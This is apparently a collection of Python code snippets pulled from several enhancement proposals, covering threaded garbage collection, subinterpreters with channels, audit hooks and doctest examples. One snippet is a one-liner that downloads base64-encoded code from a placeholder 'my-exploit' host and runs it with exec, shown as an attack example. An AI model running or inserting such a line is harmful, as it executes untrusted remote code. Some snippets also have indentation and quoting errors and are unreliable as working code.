["```py\n                  def collect_with_callback(generation):\n                      \"\"\"\n                      Collect up to the given *generation*.\n                      \"\"\"\n                      # Same code as currently \n                      # (see collect_with_callback() in gcmodule.c)\n```", "```py\n                  def collect_generations():\n                      \"\"\"\n                      Collect as many generations as desired \n                      by the heuristic.\n                      \"\"\"\n                      # Same code as currently \n                      # (see collect_generations() in gcmodule.c)\n```", "```py\n                  def lock_and_collect(generation=-1):\n                      \"\"\"\n                      Perform a collection with thread safety.\n                      \"\"\"\n                      me = PyThreadState_GET()    \n                      if gc_mutex.owner == me:\n                          # reentrant GC collection request, bail out\n                          return\n                  Py_BEGIN_ALLOW_THREADS    \n                  gc_mutex.lock.acquire()\n                  Py_END_ALLOW_THREADS\n                  gc_mutex.owner = me\n                  try:\n                      if generation >= 0:\n                          return collect_with_callback(generation)\n                      else:\n                          return collect_generations()\n                  finally:\n                      gc_mutex.owner = NULL\n                      gc_mutex.lock.release()\n```", "```py\n                  def schedule_gc_request():\n                      \"\"\"\n                      Ask the GC thread to run an implicit collection.\n                      \"\"\"\n                      assert gc_is_threaded == True\n                      # Note this is extremely fast \n                      # if a collection is already requested\n                      if gc_thread.collection_requested == False:\n                          gc_thread.collection_requested = True\n                          gc_thread.wakeup.release()\n```", "```py\n                  def is_implicit_gc_desired():\n                      \"\"\"\n                      Whether an implicit GC run is currently desired based \n                      on allocation stats. Return a generation number, \n                      or -1 if none desired.\n                      \"\"\"\n                      # Same heuristic as currently \n                      # (see _PyObject_GC_Alloc in gcmodule.c)\n```", "```py\n                  def PyGC_Malloc():\n                      \"\"\"\n                      Allocate a GC-enabled object.\n                      \"\"\"\n                      # Update allocation statistics (same code \n                      # as currently, omitted for brevity)\n                      if is_implicit_gc_desired():\n                          if gc_is_threaded:\n                              schedule_gc_request()\n                          else:\n                              lock_and_collect()\n                      # Go ahead with allocation (same code as currently, \n                      # omitted for brievity)\n```", "```py\n                  def gc_thread(interp_state):\n                      \"\"\"\n                      Dedicated loop for threaded GC.\n                      \"\"\"\n                      # Init Python thread state \n                      # (omitted, see t_bootstrap in _threadmodule.c)\n                      # Optional: init thread in Python threading module, \n                      # for better introspection\n                      me = threading._ensure_dummy_thread(name=\"GC thread\")\n                      while gc_is_threaded == True:\n                          Py_BEGIN_ALLOW_THREADS\n                          gc_thread.wakeup.acquire()\n                          Py_END_ALLOW_THREADS\n                          if gc_thread.collection_requested != 0:    \n                              gc_thread.collection_requested = 0\n                               lock_and_collect(generation=-1)\n                      threading._remove_dummy_thread(me)\n                      # Signal we're exiting\n                      gc_thread.done.release()\n                      # Free Python thread state (omitted)\n```", "```py\n                    def gc.set_mode(mode):\n                        \"\"\"\n                        Set current GC mode. \n                        This is a process-global setting.\n                        \"\"\"\n                        if mode == \"threaded\":\n                            if not gc_is_threaded == False:\n                                # Launch thread\n                                gc_thread.done.acquire(block=False) \n                                # should not fail\n                                gc_is_threaded = True\n                                    PyThread_start_new_thread(gc_thread)\n                        elif mode == \"serial\":\n                            if gc_is_threaded == True:\n                                # Wake up thread, asking it to end\n                                gc_is_threaded = False\n                                gc_thread.wakeup.release()\n                                # Wait for thread exit    \n                                Py_BEGIN_ALLOW_THREADS\n                                gc_thread.done.acquire()\n                                Py_END_ALLOW_THREADS\n                                gc_thread.done.release()\n                        else:\n                            raise ValueError(\"unsupported mode %r\" %\n                                             (mode,))\n```", "```py\n                   def gc.get_mode(mode):\n                       \"\"\"\n                       Get current GC mode.\n                       \"\"\"\n                       return \"threaded\" if gc_is_threaded else \"serial\"\n```", "```py\n                   def gc.collect(generation=2):\n                       \"\"\"\n                       Schedule collection of the given generation \n                       and wait for it to finish.\n                       \"\"\"\n                       return lock_and_collect(generation)\n```", "```py\n        interp = interpreters.create()\n        print('before')\n        interp.run('print(\"during\")')\n        print('after')\n```", "```py\n        interp = interpreters.create()\n        def run():\n            interp.run('print(\"during\")')\n        t = threading.Thread(target=run)\n        print('before')\n        t.start()\n        print('after')\n```", "```py\n        interp = interpreters.create()\n        interp.run(tw.dedent(\"\"\"\n            import some_lib\n            import an_expensive_module\n            some_lib.set_up()\n        \"\"\"))\n        wait_for_request()    \n        interp.run(tw.dedent(\"\"\"\n            some_lib.handle_request()\n        \"\"\"))\n```", "```py\n        interp = interpreters.create()\n        try:\n            interp.run(tw.dedent(\"\"\"\n                raise KeyError\n            \"\"\"))\n        except KeyError:\n            print(\"got the error from the subinterpreter\")\n```", "```py\n        interp = interpreters.create()\n        r, s = interpreters.create_channel()\n        def run():\n            interp.run(tw.dedent(\"\"\"\n                reader.recv()\n                print(\"during\")\n                reader.close()\n                \"\"\"),\n                shared=dict(\n                    reader=r,\n                ),\n            )\n            t = threading.Thread(target=run)\n            print('before')\n            t.start()\n            print('after')\n            s.send(b'')\n            s.close()\n```", "```py\n        interp = interpreters.create()\n        r1, s1 = interpreters.create_channel()\n        r2, s2 = interpreters.create_channel()\n        def run():\n            interp.run(tw.dedent(\"\"\"\n                fd = int.from_bytes(\n                    reader.recv(), 'big')\n                for line in os.fdopen(fd):\n                    print(line)\n                writer.send(b'')\n                \"\"\"),\n                shared=dict(\n                    reader=r,\n                    writer=s2,\n                ),\n            )\n            t = threading.Thread(target=run)\n            t.start()\n            with open('spamspamspam') as infile:\n                fd = infile.fileno().to_bytes(1, 'big')\n                s.send(fd)\n                r.recv()\n```", "```py\n        interp = interpreters.create()\n        r, s = interpreters.create_fifo()\n        interp.run(tw.dedent(\"\"\"\n            import marshal\n            \"\"\"),\n            shared=dict(\n                reader=r,\n            ),\n        )\n        def run():\n            interp.run(tw.dedent(\"\"\"\n                data = reader.recv()\n                while data:\n                    obj = marshal.loads(data)\n                    do_something(obj)\n                    data = reader.recv()\n                reader.close()\n            \"\"\"))\n            t = threading.Thread(target=run)\n            t.start()\n            for obj in input:\n                data = marshal.dumps(obj)\n                s.send(data)\n            s.send(None)\n```", "```py\n        interp = interpreters.create()\n        r, s = interpreters.create_channel()\n        interp.run(tw.dedent(\"\"\"\n            import pickle\n            \"\"\"),\n            shared=dict(\n                reader=r,\n            ),\n        )\n        def run():\n            interp.run(tw.dedent(\"\"\"\n                data = reader.recv()\n                while data:\n                    obj = pickle.loads(data)\n                    do_something(obj)\n                    data = reader.recv()\n                reader.close()\n            \"\"\"))\n            t = threading.Thread(target=run)\n            t.start()\n            for obj in input:\n                data = pickle.dumps(obj)\n                s.send(data)\n            s.send(None)\n```", "```py\n        interp = interpreters.create()\n        main_module = mod_name\n        interp.run(f\"import runpy; runpy.run_module({main_module!r})')\n```", "```py\n        interp = interpreters.create()\n        main_script = path_name\n        interp.run(f\"import runpy; runpy.run_path({main_script!r})\")\n```", "```py\n        interps = [interpreters.create() for i in range(5)]\n        with concurrent.futures.ThreadPoolExecutor(max_workers=len(interps)) as pool:\n            print('before')\n            for interp in interps:\n                pool.submit(interp.run, 'print(\"starting\"); print(\"stopping\")'\n            print('after')\n```", "```py\npython -c \"import urllib.request, base64;\n    exec(base64.b64decode(\n        urllib.request.urlopen('http://my-exploit/py.b64')\n    ).decode())\"\n```", "```py\n      # Add an auditing hook\n      sys.addaudithook(hook: Callable[str, tuple]) -> None\n\n      # Raise an event with all auditing hooks\n      sys.audit(str, *args) -> None\n```", "```py\n        # Open a file using the handler\n        _imp.open_for_import(path)\n```", "```py\n      perl -e 'do{print(\"perl> \");$_x=<>;chomp \n      $_x;print(eval($_x).\"\\n\")}while($_x ne \"q\")'\n```", "```py\n        def get_pressure():\n            \"\"\"Returns the pressure in the system.\"\"\"\n            return sys_press\n\n        def calc_press_diff(in, out):\n            \"\"\"Calculates the pressure drop across a valve.\n\n            :param in: Input pressure\n            :param out: Output pressure \n\n            :return The valve pressure drop\n            \"\"\"\n            deltaP = out - in\n            return deltaP\n```", "```py\n        \"\"\"\n        Factorial module.\n\n        This module manually defines the factorial() function \n        (ignoring the fact that Python includes math.factorial()).\n        For example,\n\n        >>> factorial(4)\n        24\n        \"\"\"\n\n        def factorial(n):\n            \"\"\"Return the factorial of n.\n\n            Normal loop\n        >>> for n in range(4): print(factorial(n))\n        1\n        1\n        2\n        6\n\n        List comprehension\n        >>> [factorial(n) for n in range(6)]\n        [1, 1, 2, 6, 24, 120]\n\n        Normal factorial\n        >>> factorial(25)\n        15511210043330985984000000\n\n        Check for negative values\n        >>> factorial(-3)\n        Traceback (most recent call last):\n        ...\n        ValueError: Value must be at least 0.\n\n        Floating point values must end in \"0\":\n        >>> factorial(25.1)\n        Traceback (most recent call last):\n        ...\n        ValueError: Float value is required to be equivalent to integer.\n        >>> factorial(25.0)\n        15511210043330985984000000\n\n        Check for outsized values:\n        >>> factorial(1e25)\n        Traceback (most recent call last):\n        ...\n        OverflowError: Value is too large to calculate.\n        \"\"\"\n\n        import math\n        if not n >= 0:\n            raise ValueError(\"Value must be at least 0.\")\n        if math.floor(n) != n:\n            raise ValueError(\"Float value is required to\n                              be equivalent to integer.\")\n        if n+1 == n:  # catch a value like 1e100\n            raise OverflowError(\"Value is too large to calculate.\")\n        result = 1\n        factor = 2\n        while factor <= n:\n            result *= factor\n            factor += 1\n        return result\n\n        if __name__ == \"__main__\":\n            import doctest\n            print(doctest.__file__)\n            doctest.testmod()\n```", "```py ``*backticks*`` ```"]